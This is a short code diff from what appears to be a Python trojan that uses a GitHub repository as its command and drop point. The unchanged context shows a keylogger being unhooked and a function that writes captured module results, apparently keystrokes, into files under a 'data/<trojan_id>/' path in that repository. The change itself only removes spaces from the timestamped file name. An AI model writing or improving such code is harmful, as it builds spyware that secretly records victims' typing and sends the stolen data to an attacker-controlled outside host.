@@ -100,7 +100,7 @@ def run(**args):
         kl.UnhookKeyboard()
 def store_module_result(data):
     gh,repo,branch = connect_to_github()
-    remote_path = "data/%s/%s.data" % (trojan_id,str(datetime.datetime.now()))                            
+    remote_path = "data/%s/%s.data" % (trojan_id,str(datetime.datetime.now()).replace(" ", ""))                            
     repo.create_file(remote_path,"Commit message",data)
     return
 def connect_to_github():
